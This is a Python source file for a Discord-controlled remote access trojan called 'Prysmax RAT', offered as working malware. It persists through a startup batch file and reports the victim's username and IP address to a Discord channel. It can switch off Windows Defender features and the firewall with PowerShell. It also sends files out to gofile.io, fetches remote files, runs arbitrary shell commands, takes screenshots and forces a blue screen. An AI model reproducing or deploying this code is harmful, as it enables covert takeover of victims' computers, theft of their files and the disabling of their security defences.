import os
import discord
import requests
import subprocess
import ctypes
import sys
import tempfile
from mss import mss


login = os.getlogin()

client = discord.Client(intents=discord.Intents.all())
session_id = open(os.path.join(tempfile.gettempdir(), 'session_id.txt'), 'r').read().strip() if os.path.exists(os.path.join(tempfile.gettempdir(), 'session_id.txt')) else open(os.path.join(tempfile.gettempdir(), 'session_id.txt'), 'w').write((session_id := os.urandom(8).hex())) or session_id

bot_token = "bot-token"
guild_id = "guild-id"
Disable_AV = False
startup_for = False

commands = "\n".join([
    "- Prysmax RAT -",
    "help - Help Command",
    "ping - Ping Command",
    "cd - Change Directory",
    "ls - List Directory",
    "download <file> - Download File",
    "upload <link> - Upload File",
    "shell - Execute CMD Command",
    "run <file> - Run an File",
    "screenshot - Take a Screenshot",
    "blue - DeadScreen",
    "exit - Exit The Session"
])

def startup(file_path=""):
    startup_is = False
    temp = os.getenv("TEMP")
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
    if file_path == "":
        file_path = sys.argv[0]
    with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)
    startup_is = True
    return startup_is

def disableav():
    try:
        subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .tmp", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection disable", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -DisableIOAVProtection $true", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -DisablePrivacyMode $true", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -DisableArchiveScanning $true", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $true", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command Set-MpPreference -ScanScheduleDay 8", shell=True)
    except:
        pass

    try:
        subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state off", shell=True)
    except:
        pass

@client.event
async def on_ready():
    guild = client.get_guild(int(guild_id))
    if guild is None:
        print("Invalid guild ID")
        return
    channel = discord.utils.get(guild.channels, name=session_id)

    if channel is not None:
        
        if startup_for == True:
            startup_is = True
        else:
            startup_is = False
            startup()
        if Disable_AV == True:
            disableav()
        ip_address = requests.get("https://ipapi.co/json/").json()
        data= ip_address['country_name'], ip_address['ip']
        embed = discord.Embed(title="Session Reconnected!", description="Prysmax are Ready Again!", color=0x7289DA)
        embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
        embed.add_field(name="RAT", value=f"```Prysmax RAT```", inline=True)

        embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
        embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
        embed.add_field(name="Startup", value=f"```{startup_is}```", inline=True)
        embed.add_field(name="Commands", value=f"```{commands}```", inline=True)
        embed.set_footer(text="Powered by prysmaxsoftware.cloud", icon_url="https://i.imgur.com/ntz643t.jpeg")

        
        await channel.send(embed=embed)
    else:
        channel = await guild.create_text_channel(session_id)

        startup_is = startup()
        ip_address = requests.get("https://ipapi.co/json/").json()
        data= ip_address['country_name'], ip_address['ip']
        embed = discord.Embed(title="New Session Created", description="Welcome to Prysmax RAT", color=0x7289DA)
        embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
        embed.add_field(name="RAT", value=f"```Prysmax RAT```", inline=True)
        embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
        embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
        embed.add_field(name="Startup", value=f"```{startup_is}```", inline=True)
        embed.add_field(name="Commands", value=f"```{commands}```", inline=True)
        embed.set_footer(text="Powered by prysmaxsoftware.cloud", icon_url="https://i.imgur.com/ntz643t.jpeg")



        
        await channel.send(embed=embed)
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ping":
        embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cd"):
        directory = message.content.split(" ")[1]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No Files Found"
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("download"):
        file = message.content.split(" ")[1]
        try:
            server = requests.get("https://api.gofile.io/getServer").json()["data"]["server"]
            link = requests.post(f"https://{server}.gofile.io/uploadFile", files={"file": open(file, "rb")}).json()["data"]["downloadPage"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content.startswith("upload"):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("shell"):
        command = message.content.split(" ")[1]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("run"):
        file = message.content.split(" ")[1]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("exit"):
        await message.channel.delete()
        await client.close()
        
    if message.content.startswith("blue"):
        await message.reply("Attempting...", delete_after = .1)
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await message.reply("Blue Successful!")
        else:
            await message.reply("Blue Failed! :(")

    if message.content.startswith("screenshot"):
        with mss() as sct:
            screenshot = sct.shot(output=os.path.join(os.getenv("TEMP"), "screenshot.png"))

        file_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        file = discord.File(file_path)

        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")

        await message.reply(embed=embed, file=file)

client.run(bot_token)
